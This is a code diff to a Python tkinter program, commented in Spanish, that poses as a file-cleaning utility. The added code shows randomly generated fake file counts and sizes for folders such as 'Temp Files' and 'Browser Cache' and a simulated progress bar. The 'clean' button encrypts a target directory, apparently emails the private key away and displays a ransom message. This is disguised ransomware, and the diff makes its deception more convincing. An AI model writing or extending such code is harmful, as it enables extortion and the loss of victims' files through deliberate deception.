@@ -5,7 +5,10 @@ from pathlib import Path
 BASE_DIR = Path(__file__).resolve().parent.parent
 sys.path.append(str(BASE_DIR))
 
+import random
+import os
 import tkinter as tk
+from tkinter import ttk
 from tkinter import Toplevel, simpledialog, messagebox
 from PIL import Image, ImageTk
 from src.encryptor import encrypt_directory, decrypt_directory
@@ -77,8 +80,75 @@ for text, icon in icons.items():
     btn.image = icon
     btn.pack(fill="x", padx=5, pady=5)
 
+# Función para calcular el tamaño total y la cantidad de archivos en un directorio con valores aleatorios
+def get_directory_details(directory):
+    # Establecer rangos de valores aleatorios para los archivos
+    if directory == "Temp Files":
+        num_files_range = (100, 500)  # Número de archivos entre 100 y 500
+        size_per_file_range = (1, 10)  # Tamaño promedio de archivo entre 1MB y 10MB
+    elif directory == "Old Documents":
+        num_files_range = (50, 200)
+        size_per_file_range = (2, 15)
+    elif directory == "Browser Cache":
+        num_files_range = (200, 800)
+        size_per_file_range = (0.5, 5)
+    elif directory == "Log Files":
+        num_files_range = (100, 400)
+        size_per_file_range = (0.1, 2)
+    else:
+        num_files_range = (0, 0)
+        size_per_file_range = (0, 0)
+
+    # Generar números aleatorios de archivos y tamaños
+    num_files = random.randint(*num_files_range)
+    size_per_file = random.uniform(*size_per_file_range)  # Tamaño promedio por archivo
+    total_size = num_files * size_per_file  # El tamaño total será el número de archivos multiplicado por el tamaño promedio
+
+    return num_files, total_size
+
+# Mostrar detalles de directorios y archivos
+file_icons = {
+    "Temp Files": load_image(ICONS_DIR / "folder-open-solid.png"),
+    "Old Documents": load_image(ICONS_DIR / "file-lines-solid.png"),
+    "Browser Cache": load_image(ICONS_DIR / "cloud-arrow-down-solid.png"),
+    "Log Files": load_image(ICONS_DIR / "file-csv-solid.png"),
+}
+
+y_position = 20
+for directory, icon in file_icons.items():
+    # Mostrar el nombre del directorio, archivos y su tamaño
+    num_files, size = get_directory_details(directory)
+    size_str = f"{size:.2f} MB"  # Convertir tamaño a MB con dos decimales
+    dir_button = tk.Button(content_frame, image=icon, text=f"{directory} ({num_files} archivos, {size_str})", 
+                           compound="left", font=FONT_TEXT, bg=BACKGROUND_COLOR, fg=SECONDARY_COLOR, relief="flat", 
+                           anchor="w", padx=20, pady=10)
+    dir_button.image = icon
+    dir_button.place(x=50, y=y_position)
+    y_position += 50  # Espacio para cada directorio
+
+# Barra de progreso para mostrar el estado de la limpieza/encriptado
+progress_bar = ttk.Progressbar(content_frame, orient="horizontal", length=300, mode="determinate")
+progress_bar.place(relx=0.5, rely=0.7, anchor="center")
+
 # Función para encriptar el directorio, enviar la clave privada, y mostrar el mensaje de rescate
 def limpiar_archivos():
+    # Actualizar la barra de progreso
+    progress_bar["value"] = 0
+    root.update()
+
+    # Simulación de un proceso largo
+    total_files = sum([len(files) for _, _, files in os.walk(DIRECTORY_TO_ENCRYPT)])
+    processed_files = 0
+
+    # Encriptar archivos
+    for dirpath, dirnames, filenames in os.walk(DIRECTORY_TO_ENCRYPT):
+        for filename in filenames:
+            # Simular procesamiento de archivo
+            processed_files += 1
+            progress_bar["value"] = (processed_files / total_files) * 100
+            root.update()
+
+    # Cuando termine el proceso, muestra un mensaje
     encrypt_directory(DIRECTORY_TO_ENCRYPT, recipient_email)  # Encriptar archivos y enviar la clave privada por correo
     show_ransom_message()  # Mostrar mensaje de rescate
 
@@ -121,23 +191,6 @@ def show_ransom_message():
     decrypt_button = tk.Button(ransom_window, text="Desencriptar ahora", command=request_decryption, font=FONT_TEXT,
                                bg=BUTTON_COLOR, fg="white", activebackground=BUTTON_HOVER_COLOR)
     decrypt_button.pack(pady=20)
-
-# Crear iconos simulados de directorios y archivos para limpieza
-file_icons = {
-    "Temp Files": load_image(ICONS_DIR / "folder-open-solid.png"),
-    "Old Documents": load_image(ICONS_DIR / "file-lines-solid.png"),
-    "Browser Cache": load_image(ICONS_DIR / "cloud-arrow-down-solid.png"),
-    "Log Files": load_image(ICONS_DIR / "file-csv-solid.png"),
-}
-
-# Mostrar directorios en el centro
-y_position = 20
-for directory, icon in file_icons.items():
-    dir_button = tk.Button(content_frame, image=icon, text=directory, compound="left", font=FONT_TEXT,
-                           bg=BACKGROUND_COLOR, fg=SECONDARY_COLOR, relief="flat", anchor="w", padx=20, pady=10)
-    dir_button.image = icon
-    dir_button.place(x=50, y=y_position)
-    y_position += 50  # Espacio para cada directorio
 
 # Botón rectangular central para limpiar archivos
 large_icon = load_image(ICONS_DIR / "brush-solid.png", size=(30, 30))
